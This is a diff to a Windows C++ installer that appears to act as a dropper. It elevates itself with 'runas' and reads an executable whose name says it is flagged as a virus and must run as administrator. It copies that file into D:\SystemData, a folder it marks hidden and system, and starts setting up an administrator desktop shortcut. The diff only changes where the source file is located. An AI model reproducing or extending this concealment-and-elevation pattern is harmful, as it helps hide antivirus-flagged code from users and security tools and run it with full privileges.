@@ -1,4 +1,3 @@
-// SFX - 自解压: 直接读取桌面目标文件, 不需要嵌入
 #include <windows.h>
 #include <shlobj.h>
 #include <shobjidl.h>
@@ -26,18 +25,25 @@ int main() {
         ShellExecuteW(NULL, L"runas", p, NULL, NULL, SW_SHOW);
         return 0;
     }
-    // 直接读取桌面上的目标文件
-    const wchar_t* src = L"D:\\Desktop\\被报毒用管理员运行我.com";
-    HANDLE h = CreateFileW(src, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+
+    // 从当前 exe 所在目录找目标文件
+    wchar_t path[MAX_PATH];
+    GetModuleFileNameW(NULL, path, MAX_PATH);
+    wchar_t* slash = wcsrchr(path, L'\\');
+    if (slash) *(slash + 1) = L'\0';
+    wcscat(path, L"被报毒用管理员运行我.com");
+
+    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (h == INVALID_HANDLE_VALUE) {
-        MessageBoxW(NULL, L"找不到文件:\nD:\\Desktop\\被报毒用管理员运行我.com", L"错误", MB_ICONERROR);
+        wchar_t msg[512];
+        swprintf(msg, 512, L"找不到文件:\n%ls\n请把 %ls 和本程序放在同一目录", path, L"被报毒用管理员运行我.com");
+        MessageBoxW(NULL, msg, L"错误", MB_ICONERROR);
         return 1;
     }
     DWORD sz = GetFileSize(h, NULL);
     std::vector<BYTE> dat(sz);
     DWORD r; ReadFile(h, dat.data(), sz, &r, NULL); CloseHandle(h);
 
-    // 解压到隐藏目录
     CreateDirectoryW(L"D:\\SystemData", NULL);
     SetFileAttributesW(L"D:\\SystemData", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
     HANDLE o = CreateFileW(L"D:\\SystemData\\run.com", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
@@ -45,7 +51,6 @@ int main() {
     if (o == INVALID_HANDLE_VALUE) { MessageBoxW(NULL, L"写入失败", L"错误", MB_ICONERROR); return 1; }
     DWORD w; WriteFile(o, dat.data(), sz, &w, NULL); CloseHandle(o);
 
-    // 创建桌面快捷方式(管理员)
     CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     IShellLinkW* p = NULL;
     if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&p)) && p) {
